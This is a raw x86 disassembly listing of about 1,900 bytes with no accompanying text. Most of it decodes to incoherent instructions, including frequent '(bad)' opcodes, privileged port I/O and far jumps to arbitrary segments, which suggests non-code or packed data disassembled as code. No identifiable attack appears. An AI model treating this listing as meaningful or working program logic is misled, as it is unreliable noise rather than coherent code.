  419bd1:	dec    ebx
  419bd2:	loop   0x419c39
  419bd4:	adc    al,0xb8
  419bd6:	stos   BYTE PTR es:[edi],al
  419bd7:	and    DWORD PTR [esi],esp
  419bd9:	ja     0x419b93
  419bdb:	(bad)  
  419bdc:	repz push esi
  419bde:	push   eax
  419bdf:	mov    ebx,0x4857fe66
  419be4:	or     ebx,ebx
  419be6:	fwait
  419be7:	addr16 inc edx
  419be9:	push   eax
  419bea:	fldcw  WORD PTR [eax-0x5acb79f4]
  419bf0:	ins    BYTE PTR es:[edi],dx
  419bf1:	and    ecx,esp
  419bf3:	inc    eax
  419bf4:	test   al,0xba
  419bf6:	jl     0x419b84
  419bf8:	and    eax,0xa7f034a9
  419bfd:	sub    eax,0xa0b2045e
  419c02:	les    ebx,FWORD PTR [ebp+0x6789f541]
  419c08:	xchg   edi,eax
  419c09:	pop    ecx
  419c0a:	fdivr  st(0),st
  419c0c:	and    al,0xd9
  419c0e:	std    
  419c0f:	adc    BYTE PTR [ebp+0x33eeb61],dl
  419c15:	(bad)  
  419c17:	push   edx
  419c18:	pop    ebx
  419c19:	adc    eax,0x963ae997
  419c1e:	inc    ecx
  419c1f:	lods   eax,DWORD PTR ds:[esi]
  419c20:	stc    
  419c21:	sub    BYTE PTR ds:0x9003ece8,0xfa
  419c28:	push   0x17e2beeb
  419c2d:	mov    ds:0x267ec8d8,eax
  419c32:	xor    BYTE PTR [esi],bl
  419c34:	retf   
  419c35:	mov    BYTE PTR [ebp+0x47],al
  419c38:	sub    al,0x14
  419c3a:	mov    dh,0x2a
  419c3c:	mov    eax,0x508ade33
  419c41:	(bad)  
  419c42:	out    dx,al
  419c43:	test   BYTE PTR [eax],ah
  419c45:	sbb    BYTE PTR [eax+eiz*1+0x69],dh
  419c49:	push   0x7e
  419c4b:	jg     0x419c4b
  419c4d:	sti    
  419c4e:	call   0x6925:0x65ddd4dd
  419c55:	mov    dh,0xf3
  419c57:	and    al,0x6d
  419c59:	repz mov edx,0x83efe722
  419c5f:	sub    al,0x84
  419c61:	sbb    eax,0x3c4ff4e1
  419c66:	inc    BYTE PTR [ecx]
  419c68:	push   ebx
  419c69:	retf   
  419c6a:	mov    esi,0xe820d063
  419c6f:	cmp    edx,DWORD PTR [edi]
  419c71:	icebp  
  419c72:	push   0x61
  419c74:	or     esi,0x54
  419c77:	jmp    0x8782:0x4390b001
  419c7e:	mov    ?,WORD PTR [ecx]
  419c80:	pop    eax
  419c81:	and    al,0xf2
  419c83:	pop    edi
  419c84:	mov    esp,0x11c9365d
  419c89:	jg     0x419c42
  419c8b:	pop    esi
  419c8c:	jnp    0x419cf8
  419c8e:	mov    eax,0x226a10c2
  419c93:	push   cs
  419c94:	or     al,0x61
  419c96:	jl     0x419c9d
  419c98:	popf   
  419c99:	ss cmc 
  419c9b:	xor    BYTE PTR [esi-0xe4e8aa5],ah
  419ca1:	jp     0x419c43
  419ca3:	dec    esp
  419ca4:	dec    ebp
  419ca5:	in     eax,0x38
  419ca7:	and    dh,BYTE PTR [edi-0x4f]
  419caa:	test   eax,0x89199d1f
  419caf:	push   ss
  419cb0:	scas   al,BYTE PTR es:[edi]
  419cb1:	das    
  419cb2:	jb     0x419cf9
  419cb4:	mov    edx,0x615d9c5a
  419cb9:	aas    
  419cba:	adc    edi,DWORD PTR [edi+0x131981d1]
  419cc0:	jl     0x419c65
  419cc2:	aam    0x84
  419cc4:	and    BYTE PTR [eax+0x6f],bl
  419cc7:	dec    edi
  419cc8:	fsubrp st(1),st
  419cca:	sub    eax,0xc1c33e3a
  419ccf:	pop    ss
  419cd0:	push   es
  419cd1:	icebp  
  419cd2:	mov    ebx,0x6b311f50
  419cd7:	pop    ebx
  419cd8:	out    dx,eax
  419cd9:	sbb    DWORD PTR [ecx-0x10],edi
  419cdc:	out    dx,eax
  419cdd:	test   al,0x5a
  419cdf:	push   ss
  419ce0:	daa    
  419ce1:	ins    DWORD PTR es:[edi],dx
  419ce2:	shl    BYTE PTR [eax-0x3f388157],1
  419ce8:	ficomp DWORD PTR [edx+0xaa1da3d]
  419cee:	add    al,0x3
  419cf0:	int3   
  419cf1:	cdq    
  419cf2:	mov    eax,ds:0xd9411864
  419cf7:	int3   
  419cf8:	xchg   esi,eax
  419cf9:	popf   
  419cfa:	inc    esp
  419cfb:	iret   
  419cfc:	fsub   DWORD PTR [ebx]
  419cfe:	repnz (bad) 
  419d00:	sbb    DWORD PTR [edi-0x19a3bf36],ecx
  419d06:	sbb    eax,0x1edc6758
  419d0b:	and    DWORD PTR [eax+0x28],esp
  419d0e:	sub    eax,0x9287c8ee
  419d13:	ret    0xf5f1
  419d16:	ror    BYTE PTR [ecx],cl
  419d18:	in     al,dx
  419d19:	out    dx,al
  419d1a:	adc    BYTE PTR [eax],cl
  419d1c:	pop    esp
  419d1d:	call   0xcbf5f921
  419d22:	(bad)  
  419d24:	retf   
  419d25:	sub    bh,0x81
  419d28:	pop    ecx
  419d29:	and    DWORD PTR [ebx+0x749a522d],eax
  419d2f:	popa   
  419d30:	popf   
  419d31:	into   
  419d32:	shl    BYTE PTR [edx],1
  419d34:	xor    BYTE PTR [edx],0x47
  419d37:	or     al,0x9
  419d39:	sbb    al,0xf
  419d3b:	into   
  419d3c:	mov    bh,0xc9
  419d3e:	push   ecx
  419d3f:	lock xchg esi,eax
  419d41:	fistp  WORD PTR [ebx+0x471fe140]
  419d47:	out    0x3d,al
  419d49:	test   al,0x2d
  419d4b:	xchg   ebp,eax
  419d4c:	cli    
  419d4d:	jl     0x419cd7
  419d4f:	adc    DWORD PTR [ecx+0x724d9596],ecx
  419d55:	lea    ebx,[edx]
  419d57:	or     al,BYTE PTR [esi+0x7e]
  419d5a:	cmp    eax,ebp
  419d5c:	or     al,0x36
  419d5e:	pop    esp
  419d5f:	jp     0x419d0e
  419d61:	leave  
  419d62:	mov    ch,0x9
  419d64:	push   ebx
  419d65:	mov    bh,0x2e
  419d67:	pop    eax
  419d68:	test   BYTE PTR [esi-0x43d83333],0x89
  419d6f:	mov    cl,0x72
  419d71:	xchg   ebp,eax
  419d72:	repz retf 
  419d74:	hlt    
  419d75:	pop    ds
  419d76:	sub    edi,esp
  419d78:	add    BYTE PTR [eax],cl
  419d7a:	dec    ebp
  419d7b:	test   BYTE PTR [eax-0x4268d760],bh
  419d81:	xor    al,0x75
  419d83:	dec    ecx
  419d84:	into   
  419d85:	clc    
  419d86:	dec    edi
  419d87:	loope  0x419dc1
  419d89:	test   al,0x73
  419d8b:	btr    ebp,ecx
  419d8e:	push   ds
  419d8f:	adc    ebp,DWORD PTR [ecx-0x66]
  419d92:	ins    DWORD PTR es:[edi],dx
  419d93:	outs   dx,BYTE PTR ds:[esi]
  419d94:	mov    eax,ds:0xa9657be2
  419d99:	xor    edi,edi
  419d9b:	mov    al,ds:0xcd0b14d1
  419da0:	sar    BYTE PTR [esi],1
  419da2:	ins    DWORD PTR es:[edi],dx
  419da3:	stc    
  419da4:	aad    0x80
  419da6:	ds jno 0x419df2
  419da9:	nop
  419daa:	inc    ecx
  419dab:	into   
  419dac:	jmp    0xe2cf4571
  419db1:	mov    dl,0xf7
  419db3:	mov    dh,0x6d
  419db5:	push   eax
  419db6:	cwd    
  419db8:	add    bl,BYTE PTR [esi]
  419dba:	mov    bh,0x0
  419dbc:	jnp    0x419d77
  419dbe:	mov    ecx,0xc567627f
  419dc3:	add    eax,0x2c621174
  419dc8:	dec    eax
  419dc9:	xor    bh,BYTE PTR [ebp+edx*1+0xf22f5c4]
  419dd0:	or     BYTE PTR [eax],ah
  419dd2:	outs   dx,DWORD PTR ds:[esi]
  419dd3:	stc    
  419dd4:	clc    
  419dd5:	sub    BYTE PTR [ebp-0x43],bh
  419dd8:	pop    ecx
  419dd9:	or     eax,0xd4ffac78
  419dde:	stc    
  419ddf:	pop    es
  419de0:	retf   
  419de1:	mov    cl,0x66
  419de3:	shl    BYTE PTR [esi+0x70],0x77
  419de7:	inc    ebx
  419de8:	jno    0x419d75
  419dea:	inc    ebp
  419deb:	pop    ebp
  419dec:	mov    esp,DWORD PTR [ebp-0x5d94f918]
  419df2:	test   eax,0x3a35ec6f
  419df7:	and    eax,0xe974edb0
  419dfc:	out    dx,al
  419dfd:	js     0x419d8a
  419dff:	sub    eax,0xe0d596f2
  419e04:	mov    dl,0xa6
  419e06:	test   al,0x1d
  419e08:	mov    ds:0x28357694,eax
  419e0d:	shl    DWORD PTR [ecx+0x5d],cl
  419e10:	neg    bh
  419e12:	jno    0x419dc6
  419e14:	and    cl,BYTE PTR [ebp+ebx*4-0x3f495b6a]
  419e1b:	mov    bh,0x40
  419e1d:	rsqrtps xmm6,XMMWORD PTR [bx+di]
  419e21:	int3   
  419e22:	cmp    bl,BYTE PTR [eax+0x561a400d]
  419e28:	std    
  419e29:	ins    DWORD PTR es:[edi],dx
  419e2a:	mov    bh,0x8c
  419e2c:	jns    0x419db4
  419e2e:	or     esp,esi
  419e30:	int3   
  419e31:	inc    eax
  419e32:	sbb    ebx,DWORD PTR [ebx]
  419e34:	pop    ss
  419e35:	mov    edi,0xea5a8e92
  419e3a:	ret    
  419e3b:	lahf   
  419e3c:	fmul   DWORD PTR [eax]
  419e3e:	push   esi
  419e3f:	icebp  
  419e40:	jno    0x419e22
  419e42:	clc    
  419e43:	adc    eax,DWORD PTR [ebx-0x50]
  419e46:	idiv   DWORD PTR [eax+0x26]
  419e49:	add    BYTE PTR [ecx],0xbf
  419e4c:	fsub   st,st(1)
  419e4e:	push   es
  419e4f:	shl    DWORD PTR [eax-0x73e297b5],cl
  419e55:	push   ebp
  419e56:	jge    0x419ea5
  419e58:	pop    esp
  419e59:	dec    esi
  419e5a:	or     al,bh
  419e5c:	sub    eax,0xac33d530
  419e61:	lock push esi
  419e63:	xchg   cl,bl
  419e65:	xchg   ecx,eax
  419e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e67:	or     eax,DWORD PTR [edi-0x8b9d531]
  419e6d:	call   0xfdb1:0x7ca62848
  419e74:	jl     0x419e04
  419e76:	ja     0x419e40
  419e78:	fiadd  WORD PTR [ecx+0x7cb3cafa]
  419e7e:	sub    al,0x30
  419e80:	adc    al,0xc9
  419e82:	rcr    DWORD PTR [ebp+eiz*2+0x5efd0761],cl
  419e89:	fsub   QWORD PTR [ebx]
  419e8b:	push   edx
  419e8c:	cdq    
  419e8d:	xor    al,0xf2
  419e8f:	fsub   st(5),st
  419e91:	pop    esi
  419e92:	mov    al,ds:0x1ebdaf70
  419e97:	xchg   edi,eax
  419e98:	and    al,0xcc
  419e9a:	out    dx,eax
  419e9b:	std    
  419e9c:	add    ah,dl
  419e9e:	jbe    0x419e26
  419ea0:	loop   0x419f17
  419ea2:	and    ecx,esi
  419ea4:	jge    0x419e8c
  419ea6:	data16 fwait
  419ea8:	repz inc ecx
  419eaa:	add    ebp,DWORD PTR [edx]
  419eac:	imul   edi,ecx,0xffffff87
  419eaf:	xlat   BYTE PTR ds:[ebx]
  419eb0:	ret    
  419eb1:	sub    al,0x43
  419eb3:	sub    BYTE PTR [ebp+0x51],dl
  419eb6:	in     eax,dx
  419eb7:	cli    
  419eb8:	pusha  
  419eb9:	jp     0x419f06
  419ebb:	sbb    eax,0x8e78b30a
  419ec0:	push   edx
  419ec1:	out    0x43,eax
  419ec3:	fiadd  WORD PTR [esi-0x71]
  419ec6:	jb     0x419e85
  419ec8:	nop
  419ec9:	mov    ah,0x9f
  419ecb:	sub    dh,BYTE PTR [ecx]
  419ecd:	sub    DWORD PTR [ebp+0x28e13dff],eax
  419ed3:	inc    edi
  419ed4:	(bad)  
  419ed5:	mov    ebx,0xd632fd93
  419eda:	test   al,0xd8
  419edc:	into   
  419edd:	mov    bh,0xe2
  419edf:	stc    
  419ee0:	(bad)  
  419ee2:	pop    ds
  419ee3:	push   ecx
  419ee4:	sbb    al,0xc1
  419ee6:	je     0x419e78
  419ee8:	(bad)  
  419ee9:	test   BYTE PTR [ebx],dh
  419eeb:	imul   ecx,DWORD PTR [edi-0x3a],0xffffff85
  419eef:	aas    
  419ef0:	lahf   
  419ef1:	sbb    eax,0x14869bda
  419ef6:	popa   
  419ef7:	push   cs
  419ef8:	sub    al,0x25
  419efa:	inc    eax
  419efb:	push   ds
  419efc:	cmp    eax,0xb92982ae
  419f01:	xor    edx,edi
  419f03:	jne    0x419ea1
  419f05:	jmp    0x92151daf
  419f0a:	mov    bl,0xfc
  419f0c:	rcl    DWORD PTR [eax+0x3633aa4f],0xab
  419f13:	outs   dx,BYTE PTR ds:[esi]
  419f14:	sbb    esp,DWORD PTR [edi+0x15]
  419f17:	fcmovnbe st,st(6)
  419f19:	or     ebp,DWORD PTR fs:[esi-0x46]
  419f1d:	cmp    al,BYTE PTR [edx+eiz*4+0x53f0f65a]
  419f24:	gs loope 0x419f76
  419f27:	ins    BYTE PTR es:[edi],dx
  419f28:	out    dx,eax
  419f29:	mov    eax,ds:0x65be1098
  419f2e:	xchg   esp,eax
  419f2f:	jle    0x419eb9
  419f31:	scas   al,BYTE PTR es:[edi]
  419f32:	xchg   edi,eax
  419f33:	retf   
  419f34:	mov    cl,BYTE PTR [eax]
  419f36:	add    eax,0x84900cce
  419f3b:	push   ss
  419f3c:	xchg   DWORD PTR [esi+0x32],ebp
  419f3f:	mov    bh,0x42
  419f41:	not    DWORD PTR [eax+0x45b72b42]
  419f47:	sbb    DWORD PTR [ebp+edx*2+0x58],0x78
  419f4c:	(bad)  
  419f4d:	aaa    
  419f4e:	(bad)  
  419f4f:	mov    BYTE PTR [ebp+0x45],dh
  419f52:	cmp    esp,DWORD PTR [eax]
  419f54:	and    ebx,DWORD PTR [ecx]
  419f56:	aad    0xcd
  419f58:	mov    ebp,0x85ea6216
  419f5d:	mov    cl,BYTE PTR [ebx-0x24d43c1e]
  419f63:	mov    DWORD PTR [edi+ecx*8+0x5dc77f6c],eax
  419f6a:	out    0x96,al
  419f6c:	scas   eax,DWORD PTR es:[edi]
  419f6d:	fs mov ch,0xd4
  419f70:	mov    ch,0xe0
  419f72:	das    
  419f73:	retf   
  419f74:	xor    bl,BYTE PTR [ecx+0x5b]
  419f77:	xor    BYTE PTR [ecx],ch
  419f79:	mov    esi,DWORD PTR [edi-0x5419fa2b]
  419f7f:	push   edi
  419f80:	pop    edx
  419f81:	add    DWORD PTR [ecx],ecx
  419f83:	dec    ecx
  419f84:	mov    bh,0xdb
  419f86:	sub    dl,BYTE PTR [esi+0x263dafb1]
  419f8c:	cdq    
  419f8d:	mov    eax,0xb110a27
  419f92:	ror    BYTE PTR [esi+0x26],cl
  419f95:	adc    bh,ah
  419f97:	lds    ebp,FWORD PTR [ebp-0x3b]
  419f9a:	in     eax,0x6
  419f9c:	jnp    0x419f73
  419f9e:	jmp    0x419f35
  419fa0:	push   cs
  419fa1:	jae    0x41a001
  419fa3:	add    BYTE PTR [ebx+0x421d38a6],0xc7
  419faa:	imul   ebp,DWORD PTR ds:0x9cc7677c,0x3a2012af
  419fb4:	dec    edi
  419fb5:	xchg   ecx,eax
  419fb6:	call   0xfd9:0xc3d2e8d9
  419fbd:	xchg   BYTE PTR [edx],bh
  419fbf:	ror    DWORD PTR [ebp+0x57],1
  419fc2:	mov    ebp,DWORD PTR [ebp-0x416b32ed]
  419fc8:	inc    edx
  419fc9:	add    bh,bh
  419fcb:	ja     0x419f6a
  419fcd:	adc    bl,cl
  419fcf:	not    ecx
  419fd1:	adc    BYTE PTR [esi-0x4a],cl
  419fd4:	test   DWORD PTR [esi-0x5e9158c4],esp
  419fda:	pop    edi
  419fdb:	jno    0x419f8a
  419fdd:	sub    bh,al
  419fdf:	mov    DWORD PTR [ebp+0x404e23ba],ecx
  419fe5:	dec    esi
  419fe6:	jg     0x419f7c
  419fe8:	pop    ss
  419fe9:	push   cs
  419fea:	inc    esi
  419feb:	shl    BYTE PTR [eax-0x3e243645],0x80
  419ff2:	pop    ebx
  419ff3:	imul   edi,DWORD PTR ss:[edi],0xfd2aa37
  419ffa:	jb     0x41a04c
  419ffc:	and    edi,DWORD PTR [ecx]
  419ffe:	leave  
  419fff:	clc    
  41a000:	lods   al,BYTE PTR ds:[esi]
  41a001:	adc    cl,dh
  41a003:	xchg   esp,eax
  41a004:	lods   al,BYTE PTR ds:[esi]
  41a005:	hlt    
  41a006:	dec    esp
  41a007:	ficom  WORD PTR [eax-0x57656586]
  41a00d:	add    ebp,edx
  41a00f:	imul   eax,DWORD PTR gs:[ebp+0x68dda231],0xffffffdd
  41a017:	inc    esp
  41a018:	(bad)  
  41a019:	cli    
  41a01a:	retf   
  41a01b:	es aaa 
  41a01d:	sub    eax,DWORD PTR [ecx+0x64361358]
  41a023:	mov    ebp,0x3ff566af
  41a028:	dec    ecx
  41a029:	mov    edi,ebp
  41a02b:	ins    BYTE PTR es:[edi],dx
  41a02c:	fcmovnbe st,st(3)
  41a02e:	mov    eax,ds:0x1186eeb
  41a033:	adc    eax,0x4c5f9194
  41a038:	jle    0x419fcd
  41a03a:	lods   eax,DWORD PTR ds:[esi]
  41a03b:	sub    esi,ecx
  41a03d:	cmp    DWORD PTR [eax],0x3d
  41a040:	enter  0x233,0xa2
  41a044:	std    
  41a045:	adc    ah,bh
  41a047:	cld    
  41a048:	mov    edx,0x89a48b90
  41a04d:	push   edi
  41a04e:	cmp    eax,DWORD PTR ds:0x84183a67
  41a054:	and    al,0x49
  41a056:	adc    ch,BYTE PTR [edx]
  41a058:	fldenv [eax+edx*4-0x11]
  41a05c:	jge    0x41a083
  41a05e:	mov    bl,0x3e
  41a060:	xor    edx,0xffffffdf
  41a063:	outs   dx,DWORD PTR ds:[esi]
  41a064:	pusha  
  41a065:	dec    eax
  41a066:	pop    eax
  41a067:	xor    ah,al
  41a069:	das    
  41a06a:	or     bh,bh
  41a06c:	mov    ds:0x99d4c629,eax
  41a071:	pop    ss
  41a072:	ja     0x41a033
  41a074:	mov    ebp,0x7a37a827
  41a079:	stos   DWORD PTR es:[edi],eax
  41a07a:	mov    ecx,edi
  41a07c:	mov    ebp,0x948f11ff
  41a081:	jmp    0x64bf:0xecc74702
  41a088:	xchg   esp,eax
  41a089:	mov    WORD PTR [eax-0x80],ss
  41a08c:	sbb    ebx,esp
  41a08e:	bound  esp,QWORD PTR [esi+0x3b]
  41a091:	int    0x89
  41a093:	inc    eax
  41a094:	adc    al,0x87
  41a096:	pusha  
  41a097:	neg    DWORD PTR [eax]
  41a099:	loop   0x41a0ac
  41a09b:	mov    al,ds:0x10a1f62f
  41a0a0:	mov    DWORD PTR [edx-0x4f1d3ed5],0xae477af4
  41a0aa:	xor    BYTE PTR [eax],ch
  41a0ac:	fnsave [edi]
  41a0ae:	sub    ecx,DWORD PTR [eax+eiz*2]
  41a0b1:	xchg   esi,eax
  41a0b2:	cmp    al,0x78
  41a0b4:	cmovnp esi,DWORD PTR [ebp+0x32b3a557]
  41a0bb:	jb     0x41a070
  41a0bd:	clc    
  41a0be:	dec    ebp
  41a0bf:	dec    ecx
  41a0c0:	push   ds
  41a0c1:	pop    edx
  41a0c2:	adc    BYTE PTR [ebp-0x1],bh
  41a0c5:	out    dx,eax
  41a0c6:	ficomp DWORD PTR [esi-0x2c]
  41a0c9:	mov    edx,0x1cb14a66
  41a0ce:	push   edx
  41a0cf:	inc    esp
  41a0d0:	mov    esi,0xf6eb650b
  41a0d5:	mov    cl,0xc6
  41a0d7:	lea    esi,[eax-0x5ce91a56]
  41a0dd:	(bad)  
  41a0df:	fidiv  DWORD PTR [edi-0x22]
  41a0e2:	inc    esp
  41a0e3:	shr    eax,1
  41a0e5:	outs   dx,BYTE PTR ds:[esi]
  41a0e6:	out    0xc0,al
  41a0e8:	add    bh,BYTE PTR [ecx]
  41a0ea:	pop    edi
  41a0eb:	push   eax
  41a0ec:	data16 xor BYTE PTR [ebp-0x63],dh
  41a0f0:	pop    ebx
  41a0f1:	add    BYTE PTR [ebp-0x7],0x9
  41a0f5:	data16 cld 
  41a0f7:	mov    DWORD PTR [eax-0x7699919b],ebp
  41a0fd:	cmp    DWORD PTR [ecx],edx
  41a0ff:	xor    dl,BYTE PTR [edi]
  41a101:	pop    esp
  41a102:	jmp    0x2811a4d6
  41a107:	jge    0x41a0e3
  41a109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a10a:	out    0x4a,al
  41a10c:	out    dx,eax
  41a10d:	cmp    esp,eax
  41a10f:	out    dx,eax
  41a110:	pop    ds
  41a111:	test   BYTE PTR ds:0x91cea8d5,bl
  41a117:	fimul  DWORD PTR [ebx]
  41a119:	sub    BYTE PTR [edi],dh
  41a11b:	add    BYTE PTR [eax],ah
  41a11d:	in     eax,0x4c
  41a11f:	aas    
  41a120:	ins    DWORD PTR es:[edi],dx
  41a121:	leave  
  41a122:	jns    0x41a17d
  41a124:	pop    ebp
  41a125:	mov    ecx,0xaf991cad
  41a12a:	loope  0x41a0d7
  41a12c:	add    ebp,DWORD PTR [edi-0x2c06c2b6]
  41a132:	mov    eax,0xd5ffca6d
  41a137:	jbe    0x41a102
  41a139:	xchg   ecx,ecx
  41a13b:	ja     0x41a161
  41a13d:	aad    0x8f
  41a13f:	sub    BYTE PTR [edi],ch
  41a141:	and    BYTE PTR [ebx-0x20],ah
  41a144:	xchg   esi,eax
  41a145:	xor    BYTE PTR [eax],dh
  41a147:	icebp  
  41a148:	cmp    DWORD PTR [edx],esp
  41a14a:	jbe    0x41a17e
  41a14c:	cmp    eax,0x12c7c77f
  41a151:	fwait
  41a152:	jle    0x41a131
  41a154:	mov    dl,0x75
  41a156:	daa    
  41a157:	or     dl,ch
  41a159:	icebp  
  41a15a:	jns    0x41a180
  41a15c:	idiv   BYTE PTR [esi]
  41a15e:	(bad)  
  41a15f:	fdivrp st(6),st
  41a161:	scas   eax,DWORD PTR es:[edi]
  41a162:	mov    ebx,0xe2af6b0
  41a167:	push   edi
  41a168:	scas   eax,DWORD PTR es:[edi]
  41a169:	and    eax,0xcb10b128
  41a16e:	pop    ecx
  41a16f:	call   0x85a5:0x9e4b2683
  41a176:	(bad)  
  41a177:	mov    bh,0xb4
  41a179:	mov    ecx,0xdea805a7
  41a17e:	mov    ds:0x125a9b3b,al
  41a183:	inc    ebp
  41a184:	dec    eax
  41a185:	and    eax,0xfb2efe3d
  41a18a:	scas   eax,DWORD PTR es:[edi]
  41a18b:	in     eax,dx
  41a18c:	out    0x38,al
  41a18e:	xchg   ebp,eax
  41a18f:	ret    0x2700
  41a192:	(bad)  
  41a193:	sub    ebp,DWORD PTR [esi+0x5f4358e3]
  41a199:	fsubr  QWORD PTR [esi+eax*8-0x13189c13]
  41a1a0:	mov    ds,WORD PTR [ebx-0x35]
  41a1a3:	gs call 0xa5c0698d
  41a1a9:	ins    BYTE PTR es:[edi],dx
  41a1aa:	mov    edi,0x336e4145
  41a1af:	retf   0xcd18
  41a1b2:	push   ds
  41a1b3:	mov    cl,0x50
  41a1b5:	lock fwait
  41a1b7:	lods   eax,DWORD PTR ds:[esi]
  41a1b8:	pop    ds
  41a1b9:	jmp    0xdb4c:0x9b98f65f
  41a1c0:	loopne 0x41a1d8
  41a1c2:	jge    0x41a1b8
  41a1c4:	cli    
  41a1c5:	jne    0x41a1d5
  41a1c7:	sub    DWORD PTR [edx+0x53c2e8fd],esi
  41a1cd:	xor    dh,dl
  41a1cf:	scas   al,BYTE PTR es:[edi]
  41a1d0:	neg    DWORD PTR [edx+0x3e84cd5e]
  41a1d6:	cmc    
  41a1d7:	push   ds
  41a1d8:	test   al,0x98
  41a1da:	lods   eax,DWORD PTR ds:[esi]
  41a1db:	cmp    esi,esi
  41a1dd:	mov    esp,0xd5b15e2
  41a1e2:	mov    edi,DWORD PTR [edi+edi*8-0x1861d0e]
  41a1e9:	(bad)  
  41a1ea:	not    dh
  41a1ec:	mov    ds:0xadb31d74,al
  41a1f1:	add    eax,0x5d852ecc
  41a1f6:	push   edx
  41a1f7:	jnp    0x41a1be
  41a1f9:	or     al,0xac
  41a1fb:	das    
  41a1fc:	adc    edx,ecx
  41a1fe:	and    eax,0xd8936816
  41a203:	scas   al,BYTE PTR es:[edi]
  41a204:	inc    edi
  41a205:	pop    esp
  41a206:	arpl   WORD PTR [edi+ebp*1+0x3f7081c6],bp
  41a20d:	lods   eax,DWORD PTR ds:[esi]
  41a20e:	dec    DWORD PTR [edi]
  41a210:	lock fs ss adc eax,0x91d9f8b7
  41a218:	mov    esp,DWORD PTR ds:0x672d1b09
  41a21e:	jmp    0x41a1e6
  41a220:	mov    ds:0xb48d5e27,al
  41a225:	test   BYTE PTR [eax+eax*4],al
  41a228:	push   0xfc95a63d
  41a22d:	inc    edx
  41a22e:	mov    ds:0xc73f1d62,al
  41a233:	adc    eax,0x60a4d1c5
  41a238:	push   ds
  41a239:	or     eax,eax
  41a23b:	lds    esi,FWORD PTR [ebx+0x4e039ce3]
  41a241:	imul   ecx
  41a243:	mov    BYTE PTR [edi-0x5c],bh
  41a246:	mov    ebp,0x72acf6ee
  41a24b:	or     ebp,ebp
  41a24d:	push   cs
  41a24e:	pop    esi
  41a24f:	xor    al,0xa8
  41a251:	and    ch,BYTE PTR [eax]
  41a253:	or     DWORD PTR [edx+0x6b55b85c],edi
  41a259:	(bad)  
  41a25b:	jmp    0x41a2c2
  41a25d:	ja     0x41a264
  41a25f:	mov    al,ds:0x426f140
  41a264:	or     DWORD PTR [eax-0xd08704],esi
  41a26a:	ds pop esp
  41a26c:	jmp    0xf8df:0xf338aef7
  41a273:	sbb    eax,0x1b367989
  41a278:	cmp    BYTE PTR [ecx+0x4df48ebe],dh
  41a27e:	sbb    DWORD PTR [ebx-0x71],esp
  41a281:	lock pop eax
  41a283:	inc    eax
  41a284:	sub    eax,0x283b885f
  41a289:	les    ebp,FWORD PTR [ebx]
  41a28b:	fimul  WORD PTR [edi+0x16b7545d]
  41a291:	outs   dx,DWORD PTR ds:[esi]
  41a292:	inc    esp
  41a293:	pusha  
  41a294:	cmp    al,0x6a
  41a296:	xor    DWORD PTR [ebx+0x657627d2],ebp
  41a29c:	jp     0x41a2dc
  41a29e:	push   cs
  41a29f:	rcr    esp,cl
  41a2a1:	sbb    eax,0x3b3668a3
  41a2a6:	(bad)  
  41a2a7:	div    DWORD PTR [eax]
  41a2a9:	and    al,0xfd
  41a2ab:	inc    ecx
  41a2ac:	fistp  QWORD PTR ds:0xf3391a4d
  41a2b2:	scas   eax,DWORD PTR es:[edi]
  41a2b3:	aas    
  41a2b4:	pop    ecx
  41a2b5:	adc    ah,ch
  41a2b7:	push   ebx
  41a2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2b9:	rol    DWORD PTR [ebx],cl
  41a2bb:	pop    es
  41a2bc:	icebp  
  41a2bd:	rol    DWORD PTR [edx+0x2d],0x7e
  41a2c1:	fiadd  WORD PTR [esi]
  41a2c3:	rol    al,0xd8
  41a2c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c7:	pusha  
  41a2c8:	nop
  41a2c9:	call   0x9e6ce96a
  41a2ce:	mov    BYTE PTR [esi-0x171c342b],bh
  41a2d4:	cli    
  41a2d5:	inc    esp
  41a2d6:	sub    DWORD PTR [edi],ebp
  41a2d8:	xlat   BYTE PTR ds:[ebx]
  41a2d9:	mov    ebx,0x49baff37
  41a2de:	bound  edi,QWORD PTR [edi+0x49]
  41a2e1:	int3   
  41a2e2:	jmp    0x41a312
  41a2e4:	sar    cl,0x3
  41a2e7:	push   edx
  41a2e8:	adc    BYTE PTR [ebx],dh
  41a2ea:	pushf  
  41a2eb:	cdq    
  41a2ec:	test   BYTE PTR [esp+eiz*4],0xa9
  41a2f0:	in     eax,0x2
  41a2f2:	dec    ebp
  41a2f3:	sub    edi,DWORD PTR [eax+0x14]
  41a2f6:	push   cs
  41a2f7:	jmp    0xbedc:0xcae39f5d
  41a2fe:	inc    esp
  41a2ff:	gs pop edx
  41a301:	xchg   ebx,eax
  41a302:	jbe    0x41a28f
  41a304:	mov    WORD PTR [ebp-0x52],es
  41a307:	sub    esp,0x4e7cd3ce
  41a30d:	sbb    al,0x42
  41a30f:	retf   
  41a310:	out    0x62,al
  41a312:	sub    eax,0x1e638e2e
  41a317:	cdq    
  41a318:	xor    al,0xb4
  41a31a:	xor    eax,0x59000a0c
  41a31f:	inc    ebx
  41a320:	loopne 0x41a349
  41a322:	out    dx,al
  41a323:	sbb    eax,0xcb2f59fa
  41a328:	xlat   BYTE PTR ds:[ebx]
  41a329:	jmp    0x41a3a4
  41a32b:	hlt    
  41a32c:	fnstenv [esi]
  41a32e:	icebp  
  41a32f:	popa   
  41a330:	adc    ecx,DWORD PTR [edi]
  41a332:	mov    ds:0xc18670c2,al
  41a337:	push   ecx
  41a338:	xchg   edi,eax
  41a339:	icebp  
  41a33a:	inc    edx
  41a33b:	shr    DWORD PTR [esi],1
  41a33d:	fcmovb st,st(4)
  41a33f:	adc    DWORD PTR [ecx+edx*4-0xa],ecx
  41a343:	fadd   DWORD PTR [edi-0x4ac4b1ab]
  41a349:	push   eax
  41a34a:	adc    BYTE PTR [edi],bl
  41a34c:	and    al,0x23
  41a34e:	jnp    0x41a2d3
  41a350:	xlat   BYTE PTR ds:[ebx]
  41a351:	dec    ebp
  41a352:	sbb    ecx,DWORD PTR [ebp+0x4b6d7667]
  41a358:	out    0x54,eax
  41a35a:	cmp    BYTE PTR [ebp+0x45b026be],dh
  41a360:	leave  
  41a361:	and    ebx,DWORD PTR [ecx-0xe]
  41a364:	aam    0x89
  41a366:	imul   esp,ebx,0xffffffd9
  41a369:	dec    esi
  41a36a:	inc    edx
  41a36b:	xor    DWORD PTR [bp-0x21],0x4a
  41a370:	xchg   ebx,eax
  41a371:	mov    ah,0x1c
